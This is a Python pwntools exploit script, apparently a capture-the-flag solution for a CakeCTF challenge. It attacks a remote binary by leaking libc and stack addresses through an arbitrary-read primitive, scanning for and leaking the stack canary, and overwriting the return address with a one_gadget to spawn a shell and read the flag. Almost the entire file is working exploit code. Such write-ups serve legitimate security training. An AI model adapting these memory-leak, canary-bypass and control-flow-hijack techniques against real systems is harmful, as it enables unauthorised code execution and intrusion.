from pwn import *
import os
import sys

HOST = 'pwn.cakectf.com'
PORT = 9004
BIN = './chall'
LIBC = './libc-2.31.so'

binary = ELF(BIN)
libc = ELF(LIBC)
prompt = ">> "
opt_new = "1"
opt_get = "2"
opt_set = "3"

if os.environ.get('debug'):
    s = process(BIN, env={'LD_PRELOAD': LIBC})
else:
    s = remote(HOST, PORT)


def new_cat(cat_type, age, name, endl=True):
    s.recvuntil(prompt)
    s.sendline(opt_new)
    s.recvuntil(': ')
    s.sendline(str(cat_type))
    s.recvuntil(': ')
    s.sendline(str(age))
    s.recvuntil(': ')
    if endl:
        s.sendline(name)
    else:
        s.send(name)


def get_cat():
    s.recvuntil(prompt)
    s.sendline(opt_get)
    s.recvuntil('Type: ')
    cat_type = s.recvuntil('\n')
    s.recvuntil('Age : ')
    age = int(s.recvuntil('\n'))
    s.recvuntil('Name: ')
    name = s.recvuntil('\n1.')[:-3]
    return (cat_type, age, name)


def set_cat(age, name, endl=True):
    s.recvuntil(prompt)
    s.sendline(opt_set)
    s.recvuntil(': ')
    s.sendline(str(age))
    s.recvuntil(': ')
    if endl:
        s.sendline(name)
    else:
        s.send(name)


def readme(addr):
    new_cat(2, addr, 'A')
    set_cat(addr, 'A' * 32)
    _, _, leak = get_cat()
    return leak

def writeme(addr, data):
    pass


def main():
    global bin_base
    bin_base = 0x400000
    setvbuf_got = bin_base + 0x7f38
    print(f"setvbuf_got = {setvbuf_got}")
    libc_leak = readme(setvbuf_got)
    print(f"libc_leak = {repr(libc_leak)}")
    setvbuf = u64(libc_leak.ljust(8, b'\x00'))
    print(f"setvbuf = {hex(setvbuf)}")
    global libc_base
    libc_base = setvbuf - 0x87e60
    libc.address = libc_base
    print(f"system = {hex(libc.symbols['system'])}")
    environ = libc_base + 0x00000000001ef2e0
    env_leak = u64(readme(environ).ljust(8, b'\x00'))
    print(f"environ = {hex(env_leak)}")

    # stack_leak = u64(readme(env_leak).ljust(8, b'\x00'))
    # print(f"stack_leak = {hex(stack_leak)}")
    # stack_base = stack_leak - 0x20fd6

    stack_base = env_leak - 0x20000 & 0xfffffffffffff000
    print(f"stack_base = {hex(stack_base)}")
    canary = -1

    for i in range(0x20d00, 0x21000, 0x8):
        # print(f"Trying i = {hex(stack_base + i)}...")
        scan = readme(stack_base + i + 1)[:8].ljust(8, b'\x00')
        scan = u64(scan)
        print(f"scan = {hex(scan)}")
        if scan == 0x4039:
            print(f"FOUND = {hex(stack_base + i)} {hex(i)}")
            canary = stack_base + i + 0x10 + 1
            break
    if canary == -1:
        return

    print(f"canary = {hex(canary)}")
    canary_leak = u64(readme(canary)[:7].rjust(8, b'\x00'))
    print(f'canary = {hex(canary_leak)}')
    one_gadget = libc_base + 0xe6c84#0xe6c81#0xe6c7e
    print(f'one_gadget = {hex(one_gadget)}')

    # payload = b'A' * 0x29 + p64(canary)[1:] + b'A' * 0x18 + p64(one_gadget)
    payload = b'A' * 0x58 + b'\x03' * 0x10 + b'B' * 8 + b'C' * 0x18 + p64(one_gadget)
    # input("pwn?")
    new_cat(3, 0x4242424242424242, b'A')
    set_cat(0x4242424242424242, payload)
    payload = b'A' * 0x58 + b'\x03' * 0x10 + b'B' + p64(canary_leak)[1:]
    set_cat(0x4242424242424242, payload)
    payload = b'A' * 0x58 + b'\x03' * 0x10
    set_cat(0x4242424242424242, payload)
    # payload = b'A' * 0x28 + p64(canary) + b'A' * 0x18 + p64(one_gadget)
    # new_cat(1, 1337, payload)
    s.sendline("4")
    s.sendline("cat flag*")
    print(s.recvuntil('}'))
    s.close()


if __name__ == '__main__':
    main()
